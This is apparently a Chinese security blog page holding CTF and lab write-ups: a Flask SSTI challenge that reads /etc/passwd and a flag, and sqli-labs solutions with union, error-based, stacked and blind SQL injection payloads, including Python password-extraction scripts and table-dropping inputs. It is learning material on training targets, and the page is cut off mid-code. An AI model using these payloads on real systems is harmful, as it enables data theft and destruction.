<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta property="og:type" content="website">
<meta property="og:title" content="Altm4nz">
<meta property="og:url" content="http://altmanz.cn/page/2/index.html">
<meta property="og:site_name" content="Altm4nz">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Altm4nz">






  <link rel="canonical" href="http://altmanz.cn/page/2/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Altm4nz</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Altm4nz</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/02/24/SSTI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Altm4nz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Altm4nz">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/24/SSTI/" itemprop="url">
                  SSTI（服务端模板注入攻击 ）
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-02-24 00:32:32 / Modified: 01:15:00" itemprop="dateCreated datePublished" datetime="2018-02-24T00:32:32+08:00">2018-02-24</time>
            

            
              

              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>源自HGAME-week3的一道题 NGC’S BLOG<br>url:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/hello/ngc</span><br></pre></td></tr></table></figure></p>
<p>学习一波ssti<br>参考链接 <a href="http://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/83999.html</a><br>        <a href="http://www.freebuf.com/articles/web/135953.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/135953.html</a><br>        <a href="http://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98928.html</a><br>这道题解法:<br>尝试SSTI注入:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/%7B%7B1+1%7D%7D</span><br></pre></td></tr></table></figure></p>
<p>返回 2 。 说明存在注入 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/%7B%7B1+1%7D%7D</span><br><span class="line">http://111.230.105.104:5000/%7B%7B&apos;&apos;.__class__.__mro__%7D%7D</span><br><span class="line">http://111.230.105.104:5000/%7B%7B%20&apos;&apos;.__class__.__mro__[2].__subclasses__()%20%7D%7D</span><br><span class="line">http://111.230.105.104:5000/%7B%7B%20&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read()%20%7D%7D //读文件</span><br></pre></td></tr></table></figure></p>
<p>提示了flag在flag中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/%7B%7B%20&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;./flag&apos;).read()%20%7D%7D</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/02/10/sqli-labs 4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Altm4nz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Altm4nz">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/10/sqli-labs 4/" itemprop="url">
                  sqli-labs(less54-less65)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-02-10 01:14:43" itemprop="dateCreated datePublished" datetime="2018-02-10T01:14:43+08:00">2018-02-10</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-02-24 00:32:54" itemprop="dateModified" datetime="2018-02-24T00:32:54+08:00">2018-02-24</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>从这部分开始<br>题目看起来都比较有趣<br>这部分题都是有查询次数限制的，读了下源码，他的数据库信息都是随机的，如果超过了次数限制，整个表都会随机重置。</p>
<h3 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h3><p>尝试闭合 直接成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or 1=1 %23</span><br><span class="line">?id=1&apos; order by 3 %23</span><br><span class="line">?id=1&apos; order by 4 %23 //爆出字段</span><br><span class="line">?id=-1&apos; union select 1,2,database() %23 //爆出库名</span><br><span class="line">?id=-1&apos; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23 //爆表</span><br><span class="line">?id=-1&apos; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6b6179736a6d316c6c6c) %23 //爆字段</span><br><span class="line">?id=-1&apos; union select 1,2,(select group_concat(secret_IC58) from kaysjm1lll) %23 //爆flag</span><br></pre></td></tr></table></figure></p>
<p>一共用了7次 爆出flag：Qn53kV6NaD4ffFR1BSA3sBkp<br>（每次的数据库名表名字段名和flag都是不一样的）</p>
<h3 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h3><p>和上面一样的套路，只是把单引号换成了括号<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1) or 1=1 %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h3><p>常规思路进行尝试 得到payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;) or  1=1 %23</span><br></pre></td></tr></table></figure></p>
<p>其他的就是常规暴库</p>
<h3 id="less-57"><a href="#less-57" class="headerlink" title="less -57"></a>less -57</h3><p>一样的套路 只不过变成了双引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; or 1=1 %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h3><p>单引号闭合 报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or  updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure></p>
<p>成功爆出库名。然后就是报错的常规操作了。</p>
<h3 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h3><p>没有符号闭合的报错注入 :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1  or  updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) or  updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure>
<h3 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) or  updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure>
<h3 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h3><p>130次的限制，盲注 。<br>但是遇到了问题就是，盲注次数控制不了在130以内，这就很头疼。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h3><p>只是换了闭合符号<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-64"><a href="#less-64" class="headerlink" title="less -64"></a>less -64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1)) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23</span><br></pre></td></tr></table></figure>
<h3 id="less-65"><a href="#less-65" class="headerlink" title="less -65"></a>less -65</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>终于做完了65关 ，看着很多，其实做起来很快。本来以前后面会比较难，其实很基础，重复的题目太多了。<br>目前不懂得地方就是限制次数的盲注脚本。还没有想到什么好的办法，以后想到了会回来补上脚本的。OVER。</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/02/09/sqli-labs 3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Altm4nz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Altm4nz">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/09/sqli-labs 3/" itemprop="url">
                  sqli-labs (less39-less53)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-02-09 23:38:18" itemprop="dateCreated datePublished" datetime="2018-02-09T23:38:18+08:00">2018-02-09</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-02-10 00:48:46" itemprop="dateModified" datetime="2018-02-10T00:48:46+08:00">2018-02-10</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h3><p>直接闭合:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1=1 %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h3><p>39题的盲注 脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload =&quot;http://localhost/sql/Less-40/?id=1&apos; and ascii(mid((select password from users where username=&apos;admin2&apos; ),%d,1))=%d and &apos;1&apos;=&apos;1&quot;%(i,j)</span><br><span class="line">        r= requests.get(url=payload)</span><br><span class="line">        if &quot;Dumb&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
<h3 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h3><p>依旧盲注,和上题一样，不需要单引号闭合。</p>
<h3 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h3><p>堆叠注入。 在;后构造新的语句造成执行。<br>比如输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usernma=123&apos;;create table haha like users;</span><br></pre></td></tr></table></figure></p>
<p>在查询后执行创造表的指令。<br>这道题堆叠注入的点在于password，用户名任意输，密码处构造注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=123&amp;login_password=123&apos;;create table hahah like users#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></p>
<p>这时候去后台查表发现已经存在hahah表了。<br>用样可以利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=123&amp;login_password=123&apos;;drop table hahah#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></p>
<p>删除hahah表。<br>这里我们用指令创造一个账号登陆<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=123&amp;login_password=123&apos;;insert into users(id,username,password) values (&apos;100&apos;,&apos;altman&apos;,&apos;altman&apos;)##&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></p>
<p>这个任意指令执行还是很危险的。</p>
<h3 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h3><p>和上题的区别就是需要加括号闭合。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=123&amp;login_password=123&apos;);drop table hahah#&amp;mysubmit=Login</span><br></pre></td></tr></table></figure></p>
<h3 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h3><p>和42题没啥区别</p>
<h3 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h3><p>和43题没啥区别</p>
<p>想了想比赛应该不会出这种堆叠注入，过滤稍微不严格的话整个数据库就要被删掉。。。也可以直接getshell</p>
<h3 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h3><p>基于错误的排序注入<br>看了下源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</span><br></pre></td></tr></table></figure></p>
<p>尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure></p>
<p>成功</p>
<h3 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h3><p>增加了单引号闭合：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos; and updatexml(1,concat(0x7e, database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<h3 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h3><p>盲注 ，各种尝试后没有结果。<br>去方方土博客看了看发现需要时间盲注 脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Author:sky</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">url = &apos;http://localhost/sql/Less-48/?sort=1 and if(((ascii(substr((select password from users where username=&quot;admin2&quot;),%s,1)))=%d),sleep(2),false)&apos;</span><br><span class="line">for x in range(1,100):</span><br><span class="line">    for y in range(33,127):</span><br><span class="line">        urll = url%(x,y)</span><br><span class="line">        try:</span><br><span class="line">            f = requests.get(url=urll,timeout=1.5)</span><br><span class="line">        except:</span><br><span class="line">            flag+=chr(y)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
<h3 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h3><p>47题的盲注版本 一样用时间盲注</p>
<h3 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h3><p>排序注入后加了堆叠注入</p>
<h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p>同上题，需要引号闭合</p>
<h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p>50的盲注，同时间注入，脚本懒得写。。。</p>
<h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p>51的盲注，时间注入</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/02/06/sqli-labs 2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Altm4nz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Altm4nz">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/06/sqli-labs 2/" itemprop="url">
                  sqli-labs (less23-less38)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-02-06 00:00:00" itemprop="dateCreated datePublished" datetime="2018-02-06T00:00:00+08:00">2018-02-06</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-02-09 23:43:07" itemprop="dateModified" datetime="2018-02-09T23:43:07+08:00">2018-02-09</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or &apos;1&apos;=&apos;</span><br></pre></td></tr></table></figure>
<p>成功闭合<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>说实话没看懂这题让干啥</p>
<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>过滤了or没过率 |<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; || updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<p>而且他只是过滤删去了or，可以重写绕过。</p>
<h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>上题的基础下进行盲注入<br>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload =&quot;http://localhost/sql/Less-25a/?id=-1 || ascii(mid((select passwoorrd from users where username=&apos;admin2&apos;),%d,1))=%d&quot;%(i,j)</span><br><span class="line">        r= requests.get(url=payload)</span><br><span class="line">        if &quot;Dumb&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p>
<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>空格绕过 用()绕过空格就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>上一题的忙注版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload =&quot;http://localhost/sql/Less-26a/?id=1&apos;anandd(ascii(mid((select(passwoorrd)from(users)where(username=&apos;admin2&apos;)),%d,1))=%d)anandd&apos;1&apos;=&apos;1&quot;%(i,j)</span><br><span class="line">        r= requests.get(url=payload)</span><br><span class="line">        if &quot;Dumb&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>过滤并不严格<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);		//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);			//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);	    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);	    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);	    //Strip out SELECT</span><br><span class="line">$id= 